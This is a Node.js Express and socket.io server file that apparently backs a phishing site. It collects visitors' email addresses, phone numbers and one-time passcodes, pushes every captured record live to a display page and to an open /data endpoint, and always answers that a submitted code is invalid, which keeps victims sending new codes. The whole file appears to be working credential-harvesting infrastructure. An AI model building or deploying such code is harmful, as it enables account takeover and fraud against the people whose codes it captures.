const express = require('express');
const bodyParser = require('body-parser');
const socketIO = require('socket.io');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory storage for demonstration
let userData = [];

app.post('/submit-email', (req, res) => {
    const { userId, email } = req.body;
    const user = userData.find(user => user.userId === userId);
    if (user) {
        user.email = email;
    } else {
        userData.push({ userId, email });
    }
    io.emit('dataUpdated', userData);
    res.sendStatus(200);
});

app.post('/submit-phone', (req, res) => {
    const { userId, phone } = req.body;
    const user = userData.find(user => user.userId === userId);
    if (user) {
        user.phone = phone;
    } else {
        userData.push({ userId, phone });
    }
    io.emit('dataUpdated', userData);
    res.sendStatus(200);
});

app.post('/submit-otp', (req, res) => {
    const { userId, otp } = req.body;
    const user = userData.find(user => user.userId === userId);
    if (user) {
        user.otp = otp;
    } else {
        userData.push({ userId, otp });
    }
    io.emit('dataUpdated', userData);
    res.json({ valid: false });
});

app.get('/data', (req, res) => {
    res.json(userData);
});

// Serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/email', (req, res) => {
    res.sendFile(path.join(__dirname, 'email.html'));
});

app.get('/phone', (req, res) => {
    res.sendFile(path.join(__dirname, 'phone.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'OTP.html'));
});

app.get('/display', (req, res) => {
    res.sendFile(path.join(__dirname, 'display.html'));
});

// Listen on the assigned port by Render, or default to 3000 for local development
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

io.on('connection', (socket) => {
    console.log('New client connected');
    socket.on('disconnect', () => {
        console.log('Client disconnected');
    });
});
